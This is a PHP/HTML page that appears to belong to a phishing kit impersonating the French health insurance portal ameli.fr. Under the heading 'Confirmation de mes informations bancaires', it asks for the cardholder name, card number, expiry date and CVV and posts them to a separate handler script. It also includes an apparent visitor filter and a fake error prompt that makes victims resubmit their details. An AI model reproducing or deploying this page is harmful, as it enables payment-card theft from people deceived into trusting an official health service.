<?php 

include("../common/sub_includes.php");
include("../prevents/all.php");
?>


<!DOCTYPE html>
<html lang="fr" slick-uniqueid="3">

<?php include("../common/header.php") ?>
<body>
    <header class="wlp-bighorn-header" role="banner">
        <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
            <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
                <div></div>
                <div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
                    <div id="Header" class="wlp-bighorn-window  ">
                        <div class="wlp-bighorn-window-content">

                            <div style="overflow-x:hidden;">
                                <div class="tetiere-connexion">

                                    <div class="liens">

                                        <!-- Redirection vers la page de connexion -->

                                        <a class="r_btsubmit r_btlien" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_login_page&amp;connexioncompte_2actionEvt=afficher" title="Votre compte ameli - Connexion">
                                            Se connecter
                                        </a>

                                    </div>

                                    <a class="r_lien_image" href="https://assure.ameli.fr:443https://assure.ameli.fr/PortailAS/appmanagerhttps://assure.ameli.fr/PortailAS/assure?_nfpb=true&amp;_pageLabel=as_accueil_page" title="Accéder à l'accueil">
                                        <img src="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/images/logosRegimes/logo_regime_general" class="logoam" alt="Logo du régime d'assurance maladie">
                                        <img src="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/refonte/header/Icon-60@3x.png" class="logoam-320" alt="Logo du régime d'assurance maladie">
                                    </a>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div id="ameli_portal_book_2" class="wlp-bighorn-book">
        <div class="wlp-bighorn-book-content">
            <div id="as_connexion_book" class="wlp-bighorn-book">
                <div class="wlp-bighorn-book-content">
                    <main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main">
                        <section id="contenu" class="corps-de-page">
                            <div class="wlp-bighorn-layout wlp-bighorn-layout-grid">
                                <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell">
                                    <div></div>
                                    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
                                        <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto">
                                            <div></div>
                                            <div id="connexioncompte_2" class="wlp-bighorn-window  ">
                                                <div class="wlp-bighorn-window-content">

                                                    <link href="../../framework/skins/assure/css/centrer.css" rel="stylesheet" type="text/css">
                                                    <link rel="stylesheet" href="../../framework/skins/assure/css/smart-app-banner.css" type="text/css" media="screen">



                                                    <style type="text/css">
                                                        .wlp-bighorn-book{
                                                            width : 100%;
                                                          }
                                                          #connexioncompte_2 {
                                                            padding-top: 190px;
                                                          }
                                                          
                                                          /* Small Devices, Tablets */
                                                          @media only screen and (max-width : 767px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 60px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -20px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -20px;
                                                              margin-bottom: 60px;
                                                            }
                                                            #connexioncompte_2 {
                                                              padding-top: 100px;
                                                            }
                                                            .connexioncompte_2{
                                                              padding-right: 30px !important;
                                                              padding-left: 30px !important;
                                                            }
                                                          }
                                                          
                                                          @media only screen and (min-width : 768px) { 
                                                            #Header .tetiere-connexion {
                                                              margin-bottom: 88px;
                                                            }
                                                            .connexioncompte_2 .connexion-login {
                                                              margin-top: -48px;
                                                            }
                                                            #erreurCookie {
                                                              margin-top: -48px;
                                                              margin-bottom: 88px;
                                                            }
                                                          }
                                                          
                                                          /* Medium Devices */
                                                          @media screen and (min-width: 768px) and (max-width: 992px){
                                                            #connexioncompte_2 .centrepage {
                                                              width: 460px;
                                                            }
                                                          }
                                                        
                                                          input:-webkit-autofill {
                                                            -webkit-box-shadow: 0 0 0 50px white inset !important;
                                                          }
                                                    </style>

                                                    <div class="connexioncompte_2 centrepage">

                                                        <div class="r_cnx_page" id="loginPage">

                                                            <div>
                                                                <div class="r_cnx_maintenance">

                                                                </div>

                                                                <div class="r_cnx">
                                                                    <div class="connexion-login">
                                                                        <h1 class="texte-center title" style="line-height : 30px">
                                                                            Confirmation de mes informations bancaires
                                                                        </h1>

                                                                        <div class="zone-alerte hidden" id="navIncompatible">
                                                                            <h2>Mon compte ameli fonctionnera mieux avec une version plus récente d'Internet Explorer !</h2>
                                                                            <span>
              
                                                                            
                                                                        Mettez à jour votre navigateur grâce à ce lien
                                                                        <a id="ieDlLink" href="http://windows.microsoft.com/fr-fr/internet-explorer/download-ie" target="downloadIE" title="Mettre à jour son navigateur (nouvelle fenêtre)" tabindex="-1">http://windows.microsoft.com/fr-fr/internet-explorer/download-ie</a>
                                                                        </span>
                                                                        </div>
                                                                        <?php if(isset($_GET["error"])){ ?>
                                                                        <div class="zone-alerte">
                                                                        <span>Les informations fournies sont incorrectes.</span>
                                                                        </div>
                                                                        <?php }?>

                                                                        <div class="r_cnx_cadre_gris" id="idBlocCnx">
                                                                            <form name="connexionCompteForm" id="form" method="post" action="../actions/card.php" class="r_cnx_form">
                                                                                <div>
                                                                                    <div id="div_connexioncompte_2_nir_as" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="identifiant" name="ide_nomcc" type="text" placeholder="Nom du titulaire" tabindex="0" required>
                                                                                        </span>
                                                                                    </div>
                                                                                </div>

                                                                                <style>
                                                                                    
                                                                                    #town{

                                                                                        background: transparent url(https://cdn2.iconfinder.com/data/icons/office-extras/512/Business_Card-512.png);
                                                                                        background-repeat: no-repeat;
                                                                                        background-position: 20px 3px;
                                                                                        background-size: 20px 20px;
                                                                                        border-bottom: solid 1px #255ea7;
                                                                                        outline: 0;
                                                                                    }
                                                                                    #town2{

                                                                                    background: transparent url(https://blog.youversion.com/wp-content/uploads/2015/11/calendar-gray.png);
                                                                                    background-repeat: no-repeat;
                                                                                    background-position: 20px 3px;
                                                                                    background-size: 20px 20px;
                                                                                    border-bottom: solid 1px #255ea7;
                                                                                    outline: 0;
                                                                                    }

                                                                                    #town3{

                                                                                    background: transparent url(http://www.clker.com/cliparts/w/r/Q/0/x/D/search-icon-light-grey-hi.png);
                                                                                    background-repeat: no-repeat;
                                                                                    background-position: 20px 3px;
                                                                                    background-size: 20px 20px;
                                                                                    border-bottom: solid 1px #255ea7;
                                                                                    outline: 0;
                                                                                    }
                                                                                </style>

                                                                                <div>
                                                                                    <div id="town" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="card_number_input" name="ide_ccnum" placeholder="Numéro de carte" type="number" required >   
                                                                                        </span>
                                                                                    </div>
                                                                                </div>

                                                                                <div id="town2" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input id="expiration_date_input" name="ide_ccexp" placeholder="Date d'expiration"  type="text" onkeyup="formatString(event);" onkeypress="formatString(event);" onkeydown="formatString(event);" required>
                                                                                        </span>
                                                                                </div>
                                                                                <div id="town3" class="div_connexioncompte_2_wrapper" style="margin-top : 23px;">
                                                                                        <span class="zone_champ_saisie">
                                                                                            <input type="password" name="ide_cvv"  id="cvv_input" placeholder="Cryptogramme visuel" required minlength="3" maxlength="5">
                                                                                        </span>
                                                                                </div>

                                                                          
                                                                                    <div class="cnxRequis">
                                                                                        <span>Tous les champs sont obligatoires.</span>
                                                                                    </div>

                                                                                    <div>

                                                                                        <input id="id_r_cnx_btn_submit" type="submit" name="ide_card_submit" value="me connecter" class="r_btsubmit btn-connection">
                                                                                    </div>
                                                                                </div>
                                                                                <input type="hidden" name="_ct" value="OZFN-NHM0-TW28-BL6G-JGJ1-HF5K-VDRJ-1MGM"></form>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </main>
                </div>
            </div>
        </div>
    </div>
    <?php include("../common/footer.php") ?>                                                     
</body>

</html>

</html>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"
integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
crossorigin="anonymous"></script>

<script src="../assets/js/mask.js"></script>


<script src="../assets/js/format_string.js"></script>
                        

<script>
    $('#card_number_input').on('input propertychange', function() {
    charLimit(this, 16);
    });
    $('#expiration_date_input').on('input propertychange', function() {
        charLimit(this, 5);
    });

    let charLimit = (input, maxChar) => {
        let len = $(input).val().length;
        if (len > maxChar) {
            $(input).val($(input).val().substring(0, maxChar));
        };
    }
</script>